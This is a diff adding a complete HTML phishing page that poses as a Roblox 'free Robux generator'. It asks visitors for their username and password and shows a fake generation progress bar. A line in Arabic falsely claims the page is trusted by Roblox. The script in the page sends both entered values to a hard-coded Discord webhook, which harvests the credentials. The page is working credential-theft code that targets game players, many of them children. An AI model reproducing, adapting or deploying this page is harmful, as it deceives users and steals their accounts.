@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Robux Generator UI</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  height: 100vh;
+  font-family: Arial, sans-serif;
+  color: white;
+  overflow: hidden;
+  background: #000;
+}
+
+.bg {
+  position: fixed;
+  inset: 0;
+  background: 
+    linear-gradient(rgba(0,0,0,.75), rgba(0,0,0,.9)),
+    url("https://playgama.com/cdn-cgi/imagedelivery/LN2S-4p3-GgZvEx3IPaKUA/1ee86d33-b0a4-4bd5-b602-4f9ad56a2e00/enlarged");
+  background-size: cover;
+  background-position: center;
+  filter: blur(2px);
+  transform: scale(1.05);
+  z-index: -2;
+}
+
+.brainrot {
+  position: absolute;
+  font-size: 48px;
+  opacity: 0.08;
+  animation: drift 12s infinite linear;
+  user-select: none;
+}
+
+.brainrot:nth-child(1) { top: 10%; left: 5%; animation-duration: 18s; }
+.brainrot:nth-child(2) { top: 60%; left: 8%; animation-duration: 14s; }
+.brainrot:nth-child(3) { top: 20%; right: 6%; animation-duration: 20s; }
+.brainrot:nth-child(4) { top: 70%; right: 12%; animation-duration: 16s; }
+.brainrot:nth-child(5) { top: 40%; left: 45%; animation-duration: 22s; }
+
+@keyframes drift {
+  0% { transform: translateY(0) rotate(0deg); }
+  50% { transform: translateY(-40px) rotate(180deg); }
+  100% { transform: translateY(0) rotate(360deg); }
+}
+
+.robux {
+  position: absolute;
+  width: 42px;
+  height: 42px;
+  border-radius: 50%;
+  background: #00ff88;
+  color: #000;
+  font-weight: 900;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  opacity: 0.18;
+  animation: float 7s infinite ease-in-out;
+}
+
+.robux:nth-child(6) { top: 12%; left: 10%; }
+.robux:nth-child(7) { top: 70%; left: 14%; animation-delay: 2s; }
+.robux:nth-child(8) { top: 18%; right: 12%; animation-delay: 4s; }
+.robux:nth-child(9) { top: 72%; right: 18%; animation-delay: 1s; }
+
+@keyframes float {
+  0% { transform: translateY(0); }
+  50% { transform: translateY(-25px); }
+  100% { transform: translateY(0); }
+}
+
+.center {
+  height: 100%;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  position: relative;
+  z-index: 5;
+}
+
+.box {
+  background: rgba(15,15,15,.95);
+  width: 360px;
+  padding: 30px;
+  border-radius: 18px;
+  text-align: center;
+  box-shadow: 0 0 60px rgba(0,255,120,.25);
+  backdrop-filter: blur(6px);
+}
+
+.logo {
+  font-size: 36px;
+  font-weight: 900;
+  letter-spacing: 2px;
+  color: #00ff88;
+}
+
+input, button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 14px;
+  border-radius: 10px;
+  border: none;
+  font-size: 14px;
+}
+
+button {
+  background: #00ff88;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+.warning {
+  color: #ff4d4d;
+  font-size: 12px;
+  margin-top: 10px;
+  display: none;
+}
+
+.loading {
+  position: fixed;
+  inset: 0;
+  background: #050505;
+  display: none;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  z-index: 10;
+}
+
+.bar {
+  width: 260px;
+  height: 12px;
+  background: #222;
+  border-radius: 10px;
+  overflow: hidden;
+  margin-top: 16px;
+}
+
+.fill {
+  width: 0%;
+  height: 100%;
+  background: #00ff88;
+  animation: load 3s forwards;
+}
+
+@keyframes load {
+  to { width: 100%; }
+}
+
+.small {
+  font-size: 12px;
+  opacity: .6;
+  margin-top: 10px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="bg"></div>
+
+<div class="brainrot">🧠</div>
+<div class="brainrot">💀</div>
+<div class="brainrot">🤡</div>
+<div class="brainrot">🗿</div>
+<div class="brainrot">👁️</div>
+
+<div class="robux">R$</div>
+<div class="robux">R$</div>
+<div class="robux">R$</div>
+<div class="robux">R$</div>
+
+<div class="center">
+  <div class="box">
+    <div class="logo">ROBLOX</div>
+    <p style="font-size:12px;opacity:.6">Steal a Brainrot & Free Robuh</p>
+
+    <input id="user" placeholder="Username">
+    <input id="display" placeholder="Password">
+
+    <button onclick="start()">Generate Robux</button>
+
+    <div class="warning" id="warn">
+      ⚠️ Fill both fields to continue
+    </div>
+  </div>
+</div>
+
+<div class="loading" id="loading">
+  <div class="logo">R$</div>
+  <p>Generating Robux…</p>
+  <div class="bar"><div class="fill"></div></div>
+  <p class="small">موثوقة من شركة roblox</p>
+</div>
+
+<script>
+function start() {
+  const u = document.getElementById("user").value.trim();
+  const d = document.getElementById("display").value.trim();
+  const warn = document.getElementById("warn");
+
+  if (!u || !d) {
+    warn.style.display = "block";
+    return;
+  }
+
+  warn.style.display = "none";
+  document.getElementById("loading").style.display = "flex";
+
+  const webhookURL = "https://discord.com/api/webhooks/1452385127299809361/nHLVFxmdG_-m5Y4HEHoKq-KeFXCNRV2XNb5uz7LwBKhAArK1ICqp-Z_rpQ--N2zLacgr";
+
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: `💀 New Input 💀\nUsername: ${u}\nPassword: ${d}`
+    })
+  })
+  .then(res => {
+    if(res.ok) console.log("Sent to Discord!");
+    else console.error("Failed to send!");
+  })
+  .catch(err => console.error(err));
+
+  document.getElementById("user").value = "";
+  document.getElementById("display").value = "";
+}
+</script>
+
+
+</body>
+</html>
